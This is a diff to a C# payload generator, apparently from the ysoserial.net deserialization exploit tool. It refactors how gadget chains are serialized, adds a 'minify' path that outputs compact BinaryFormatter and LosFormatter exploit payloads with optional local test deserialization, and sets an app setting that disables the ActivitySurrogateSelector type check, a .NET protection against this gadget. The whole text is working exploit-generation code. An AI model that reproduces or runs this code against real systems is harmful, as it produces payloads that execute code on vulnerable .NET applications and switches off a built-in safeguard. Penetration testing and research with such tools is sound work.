@@ -6,7 +6,6 @@ using System.ComponentModel.Design;
 using System.Data;
 using System.IO;
 using System.Reflection;
-using System.Runtime.Serialization.Formatters.Binary;
 using System.Web.UI.WebControls;
 using System.Runtime.Serialization;
 using ysoserial.Helpers;
@@ -192,10 +191,8 @@ namespace ysoserial.Generators
             return ls;
         }
 
-        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        public byte[] GadgetChainsToBinaryFormatter()
         {
-            System.Diagnostics.Trace.WriteLine("In GetObjectData");
-
             List<object> ls = GadgetChains();
 
             // Wrap the object inside a DataSet. This is so we can use the custom
@@ -233,13 +230,19 @@ namespace ysoserial.Generators
             }
             else
             {
-                BinaryFormatter fmt = new BinaryFormatter();
+                System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                 fmt.SurrogateSelector = new MySurrogateSelector();
                 fmt.Serialize(stm, ls);
             }
-            
+
+            return stm.ToArray();
+        }
+
+        public void GetObjectData(SerializationInfo info, StreamingContext context)
+        {
+            System.Diagnostics.Trace.WriteLine("In GetObjectData");
             info.SetType(typeof(System.Windows.Forms.AxHost.State));
-            info.AddValue("PropertyBagBinary", stm.ToArray());
+            info.AddValue("PropertyBagBinary", GadgetChainsToBinaryFormatter());
             //*/
         }
     }
@@ -288,7 +291,48 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
+            // Disable ActivitySurrogate type protections during generation
+            System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
+
             PayloadClass payload = new PayloadClass(variant_number, inputArgs);
+            if (inputArgs.Minify)
+            {
+                byte[] payloadInByte = payload.GadgetChainsToBinaryFormatter();
+                if (formatter.ToLower().Equals("binaryformatter"))
+                {
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            SerializersHelper.BinaryFormatter_deserialize(payloadInByte);
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
+                    }
+
+                    return payloadInByte;
+                }
+                else if (formatter.ToLower().Equals("losformatter"))
+                {
+                    payloadInByte = Helpers.ModifiedVulnerableBinaryFormatters.SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(payload.GadgetChainsToBinaryFormatter());
+
+                    if (inputArgs.Test)
+                    {
+                        try
+                        {
+                            SerializersHelper.LosFormatter_deserialize(payloadInByte);
+                        }
+                        catch (Exception err)
+                        {
+                            Debugging.ShowErrors(inputArgs, err);
+                        }
+                    }
+                    return payloadInByte;
+                }
+            }
+
             return Serialize(payload, formatter, inputArgs);
         }
 
